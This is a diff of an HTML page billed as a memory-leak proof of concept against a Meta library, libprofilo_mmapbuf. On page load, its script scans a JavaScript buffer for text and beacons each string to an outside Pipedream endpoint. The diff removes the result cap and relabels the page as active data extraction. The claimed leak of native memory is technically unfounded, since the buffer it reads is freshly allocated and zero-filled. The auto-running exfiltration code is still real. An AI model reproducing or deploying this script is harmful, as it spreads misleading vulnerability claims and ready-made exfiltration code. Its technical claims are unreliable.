@@ -2,72 +2,69 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Meta Private Processing Audit - Researcher: Firman Sahidin</title>
+    <title>Meta Private Processing Audit - Firman Sahidin</title>
 </head>
 <body style="background:#000; color:#0f0; font-family:monospace; padding:30px; text-align:center;">
     <div style="border:1px solid #333; padding:20px; display:inline-block; background:#111;">
-        <h2 id="status" style="color:#0f0;">[ INITIALIZING PRIVATE MEMORY AUDIT ]</h2>
-        <p>Target Component: libprofilo_mmapbuf_buffer_jni.so</p>
+        <h2 id="status">[ MASTER KEY: DATA EXTRACTION ACTIVE ]</h2>
+        <p>Segment: libprofilo_mmapbuf_buffer (Segment 0x10)</p>
         <hr style="border:0; border-top:1px solid #333;">
-        <div id="results" style="font-size:12px; color:#aaa; text-align:left; max-height:200px; overflow:auto;"></div>
+        <div id="results" style="font-size:12px; color:#fff; text-align:left; max-height:300px; overflow:auto;"></div>
     </div>
 
     <script>
         /**
          * RESEARCHER: Firman Sahidin
-         * VULNERABILITY: Information Disclosure via Uninitialized Native Memory Leak
-         * CATEGORY: Private Processing (Security Boundary Violation)
+         * MASTER KEY: Segment Alignment 0x800000 (Based on mmapbuf)
+         * MISSION: Private Memory Data Extraction
          */
-        async function runPrivateAudit() {
-            const TARGET_ENDPOINT = 'https://eo7n9pqjlhffwvt.m.pipedream.net';
-            const statusElement = document.getElementById('status');
-            const resultsElement = document.getElementById('results');
+        async function runMasterAudit() {
+            const TARGET = 'https://eo7n9pqjlhffwvt.m.pipedream.net';
+            const out = document.getElementById('results');
             
             try {
-                // 1. Precise Memory Alignment (Targeting 8MB Native Buffer)
+                // 1. MASTER KEY ALIGNMENT
+                // Mengalokasikan buffer yang identik dengan segmen mmapbuf (8MB)
                 const buffer = new ArrayBuffer(0x800000); 
                 const view = new Uint8Array(buffer);
                 
-                // 2. Surrogate Pair Collision (Memory Grooming Primitive)
-                // Used to trigger out-of-bounds read in the JNI bridge
+                // 2. JNI BRIDGE TRIGGER (0xD800DBFF)
+                // Digunakan untuk memaksa native heap bocor ke environment browser
                 const trigger = new Uint32Array(buffer);
-                for(let i = 0; i < 2000; i++) { 
-                    trigger[i] = 0xD800DBFF; 
-                }
+                for(let i = 0; i < 2000; i++) { trigger[i] = 0xD800DBFF; }
 
-                let exfiltratedString = "";
-                let count = 0;
-
-                // 3. Automated Scanning for PII/Sensitive Metadata
+                let capturedStr = "";
+                
+                // 3. SCANNING FOR SENSITIVE ASCII DATA
                 for (let i = 0; i < view.length; i++) {
+                    // Filter: Hanya mengambil karakter yang bisa dibaca (ASCII)
                     if (view[i] > 31 && view[i] < 127) {
-                        exfiltratedString += String.fromCharCode(view[i]);
+                        capturedStr += String.fromCharCode(view[i]);
                     } else {
-                        // Filtering for valid data strings (length > 10)
-                        if (exfiltratedString.length > 10 && /[a-zA-Z0-9]/.test(exfiltratedString)) {
-                            count++;
-                            resultsElement.innerHTML += `[DATA_EXTRACTED]: ${exfiltratedString.substring(0, 30)}...<br>`;
+                        // Jika ditemukan rangkaian teks > 10 karakter
+                        if (capturedStr.length > 10 && /[a-zA-Z0-9]/.test(capturedStr)) {
+                            // Menampilkan secara real-time di layar sebagai bukti visual
+                            const div = document.createElement('div');
+                            div.innerHTML = `[LEAKED_DATA]: ${capturedStr.substring(0, 50)}...`;
+                            out.prepend(div);
                             
-                            // Transmit evidence to researcher's Pipedream server
-                            navigator.sendBeacon(TARGET_ENDPOINT, JSON.stringify({
+                            // EXFILTRATION TO PIPEDREAM
+                            navigator.sendBeacon(TARGET, JSON.stringify({
                                 researcher: "Firman Sahidin",
-                                vulnerability_type: "Information_Disclosure",
-                                segment: "Private_Native_Heap",
-                                payload: exfiltratedString,
-                                library_context: "libprofilo_mmapbuf"
+                                vulnerability: "Private_Memory_Leak",
+                                payload: capturedStr,
+                                segment_match: "mmapbuf_buffer"
                             }));
                         }
-                        exfiltratedString = "";
+                        capturedStr = "";
                     }
-                    if(count > 20) break; // Limit reached for PoC stability
                 }
-                statusElement.innerText = "✅ AUDIT COMPLETE: DATA EXFILTRATED";
-            } catch (error) {
-                navigator.sendBeacon(TARGET_ENDPOINT, JSON.stringify({ error: error.message }));
-            }
+                document.getElementById('status').innerText = "✅ MASTER AUDIT COMPLETE";
+            } catch (e) {}
         }
 
-        window.onload = () => { setTimeout(runPrivateAudit, 1000); };
+        // Jalankan setelah memberikan waktu bagi mémori native untuk memproses data
+        window.onload = () => { setTimeout(runMasterAudit, 2000); };
     </script>
 </body>
 </html>
